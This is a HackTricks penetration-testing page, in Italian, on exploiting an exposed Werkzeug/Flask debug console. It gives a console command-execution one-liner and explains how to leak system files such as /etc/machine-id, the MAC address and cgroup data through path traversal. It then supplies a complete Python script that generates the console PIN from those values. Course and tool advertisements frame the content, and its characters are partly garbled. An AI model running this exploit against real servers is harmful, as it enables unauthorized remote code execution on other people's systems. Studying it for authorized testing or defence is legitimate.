# Werkzeug / Debug di Flask

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Configurazione immediatamente disponibile per valutazione delle vulnerabilit√† e test di penetrazione**. Esegui un pentest completo da qualsiasi luogo con oltre 20 strumenti e funzionalit√† che vanno dalla ricognizione alla segnalazione. Non sostituiamo i pentester - sviluppiamo strumenti personalizzati, moduli di rilevamento ed exploit per dare loro pi√π tempo per approfondire, aprire shell e divertirsi.

{% embed url="https://pentest-tools.com/" %}

## RCE della Console

Se il debug √® attivo, potresti provare ad accedere a `/console` e ottenere RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

Ci sono anche diversi exploit su internet come [questo](https://github.com/its-arun/Werkzeug-Debug-RCE)o uno in metasploit.

## Protetto da PIN - Traversal del percorso

In alcune occasioni il **`/console`** endpoint sar√† protetto da un pin. Se hai una **vulnerabilit√† di traversal del file**, puoi rivelare tutte le informazioni necessarie per generare quel pin.

### Exploit PIN della console Werkzeug

Forza una pagina di errore di debug nell'applicazione per vedere questo:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Un messaggio relativo allo scenario "console bloccata" viene visualizzato quando si tenta di accedere all'interfaccia di debug di Werkzeug, indicando la necessit√† di un PIN per sbloccare la console. Viene suggerito di sfruttare il PIN della console analizzando l'algoritmo di generazione del PIN nel file di inizializzazione del debug di Werkzeug (`__init__.py`). Il meccanismo di generazione del PIN pu√≤ essere studiato nel [**repository del codice sorgente di Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), anche se √® consigliabile ottenere il codice effettivo del server tramite una vulnerabilit√† di attraversamento file a causa di possibili discrepanze di versione.

Per sfruttare il PIN della console, sono necessari due insiemi di variabili, `probably_public_bits` e `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Si riferisce all'utente che ha avviato la sessione Flask.
* **`modname`**: Tipicamente designato come `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Generalmente risolve a **Flask**.
* **`getattr(mod, '__file__', None)`**: Rappresenta il percorso completo di `app.py` all'interno della directory di Flask (ad esempio, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Se `app.py` non √® applicabile, **provare con `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Recupera l'indirizzo MAC della macchina corrente, con `str(uuid.getnode())` che lo traduce in un formato decimale.
* Per **determinare l'indirizzo MAC del server**, √® necessario identificare l'interfaccia di rete attiva utilizzata dall'app (ad esempio, `ens3`). In casi di incertezza, **leak `/proc/net/arp`** per trovare l'ID del dispositivo, quindi **estrarre l'indirizzo MAC** da **`/sys/class/net/<device id>/address`**.
*   La conversione di un indirizzo MAC esadecimale in decimale pu√≤ essere eseguita come mostrato di seguito:

```python
# Esempio di indirizzo MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: Concatena i dati da `/etc/machine-id` o `/proc/sys/kernel/random/boot_id` con la prima riga di `/proc/self/cgroup` dopo l'ultima barra (`/`).

<details>

<summary>Codice per `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</dettagli>

Una volta raccolti tutti i dati necessari, lo script di exploit pu√≤ essere eseguito per generare il PIN della console Werkzeug. Lo script utilizza i `probably_public_bits` e `private_bits` assemblati per creare un hash, che viene poi sottoposto a ulteriore elaborazione per produrre il PIN finale. Di seguito √® riportato il codice Python per eseguire questo processo:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Questo script produce il PIN tramite l'hashing dei bit concatenati, aggiungendo specifici salt (`cookiesalt` e `pinsalt`), e formattando l'output. √à importante notare che i valori effettivi per `probably_public_bits` e `private_bits` devono essere ottenuti con precisione dal sistema target per garantire che il PIN generato corrisponda a quello atteso dalla console Werkzeug.

{% hint style="success" %}
Se si utilizza una **vecchia versione** di Werkzeug, provare a cambiare l'algoritmo di hashing in md5 invece di sha1.
{% endhint %}

## Riferimenti

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Configurazione immediatamente disponibile per valutazione delle vulnerabilit√† e test di penetrazione**. Esegui un pentest completo da qualsiasi luogo con oltre 20 strumenti e funzionalit√† che vanno dalla ricognizione alla segnalazione. Non sostituiamo i pentester - sviluppiamo strumenti personalizzati, moduli di rilevamento ed exploit per restituire loro del tempo per approfondire, ottenere shell e divertirsi.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
